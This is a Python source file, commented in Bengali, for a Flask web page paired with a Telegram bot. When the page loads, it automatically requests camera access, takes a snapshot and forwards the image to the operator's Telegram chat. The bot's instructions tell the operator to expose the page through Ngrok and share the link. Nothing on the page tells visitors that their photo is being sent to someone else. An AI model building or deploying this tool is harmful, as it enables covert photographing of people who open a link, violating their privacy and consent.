import os
import io
import base64
import threading
import requests
from flask import Flask, request, render_template_string, jsonify
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

app = Flask(__name__)

# আপনার বট টোকেন এবং চ্যাট আইডি
BOT_TOKEN = "bot token"
CHAT_ID = "chat id"


def send_photo_to_telegram(photo_file, chat_id, bot_token):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    files = {"photo": photo_file}
    payload = {"chat_id": chat_id}

    try:
        response = requests.post(url, files=files, data=payload, timeout=30)
        response.raise_for_status()
        if response.status_code == 200:
            return {"status": "success"}
        return {"status": "error", "details": response.text}
    except requests.RequestException as e:
        return {"status": "error", "details": str(e)}


def capture_and_send_photo(photo_data):
    try:
        if "," in photo_data:
            image_data = photo_data.split(",", 1)[1]
        else:
            return {"status": "error", "details": "Invalid image data format"}

        image_bytes = base64.b64decode(image_data)
        photo_file = io.BytesIO(image_bytes)
        photo_file.name = "capture.jpg"
        return send_photo_to_telegram(photo_file, CHAT_ID, BOT_TOKEN)
    except Exception as e:
        return {"status": "error", "details": str(e)}


@app.route("/")
def index():
    return render_template_string(
        """
        <!DOCTYPE html>
        <html lang="bn">
        <head>
            <meta charset="UTF-8">
            <title>Camera Bot</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    padding: 50px;
                    background-color: #f0f0f0;
                }
                h1 {
                    color: #333;
                }
                .status {
                    font-size: 18px;
                    margin-top: 20px;
                    padding: 15px;
                    border-radius: 5px;
                }
                .success {
                    background-color: #d4edda;
                    color: #155724;
                }
                .loading {
                    background-color: #cfe2ff;
                    color: #084298;
                }
                .error {
                    background-color: #f8d7da;
                    color: #842029;
                }
            </style>
        </head>
        <body>
            <h1>📸 ক্যামেরা থেকে স্বয়ংক্রিয় ছবি ক্যাপচার</h1>
            <div id="status" class="status loading">
                ⏳ ক্যামেরা প্রস্তুত করছি...
            </div>

            <script>
                async function captureAndSend() {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();

                        video.onplaying = async () => {
                            // 500ms পর ছবি তুলুন (ক্যামেরা সঠিকভাবে চালু হওয়ার জন্য)
                            setTimeout(async () => {
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;

                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                                const photo = canvas.toDataURL('image/jpeg', 0.9);

                                // Status update
                                document.getElementById('status').textContent = '📤 ছবি পাঠাচ্ছি...';
                                document.getElementById('status').className = 'status loading';

                                // সার্ভারে পাঠান
                                const response = await fetch('/capture', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ photo: photo })
                                });

                                const result = await response.json();

                                // ক্যামেরা বন্ধ করুন
                                stream.getTracks().forEach(track => track.stop());

                                // ফলাফল দেখান
                                if (result.status === 'success') {
                                    document.getElementById('status').textContent = '✅ ছবি সফলভাবে পাঠানো হয়েছে!';
                                    document.getElementById('status').className = 'status success';
                                } else {
                                    document.getElementById('status').textContent = '❌ ত্রুটি: ' + result.details;
                                    document.getElementById('status').className = 'status error';
                                }
                            }, 500);
                        };
                    } catch (error) {
                        document.getElementById('status').textContent = '❌ ক্যামেরা অ্যাক্সেস করতে সমস্যা: ' + error.message;
                        document.getElementById('status').className = 'status error';
                    }
                }

                // পেজ লোড হওয়ার সাথে সাথে চালু করুন
                window.onload = captureAndSend;
            </script>
        </body>
        </html>
        """
    )


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(silent=True)

    if not data or "photo" not in data:
        return jsonify({"status": "error", "details": "ছবি ডেটা পাওয়া যায় নাই"}), 400

    result = capture_and_send_photo(data["photo"])
    return jsonify(result)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📸 ক্যামেরা থেকে ছবি তুলতে নিচের লিংকে ক্লিক করুন:\n\n"
        "⚠️ গুরুত্বপূর্ণ:\n"
        "১. Ngrok চালু করুন (নতুন টার্মিনালে)\n"
        "२. লিংকে ক্লিক করুন\n"
        "३. Camera access allow করুন\n"
        "४. স্বয়ংক্রিয়ভাবে ছবি ক্যাপচার হবে\n"
        "५. ছবি আপনার Telegram-এ পাঠানো হবে\n\n"
        "👉 localhost URL: http://127.0.0.1:5000"
    )


def run_flask():
    app.run(host="0.0.0.0", port=5000, use_reloader=False, debug=False)


def main():
    # Flask সার্ভার চালু করুন
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    print("🌐 Web Server চলছে: http://127.0.0.1:5000")
    print("✅ Telegram Bot শুরু হচ্ছে...")

    # Telegram Bot চালু করুন
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    start_handler = CommandHandler("start", start)
    application.add_handler(start_handler)

    print("🤖 Bot is running...")
    application.run_polling()


if __name__ == "__main__":
    main()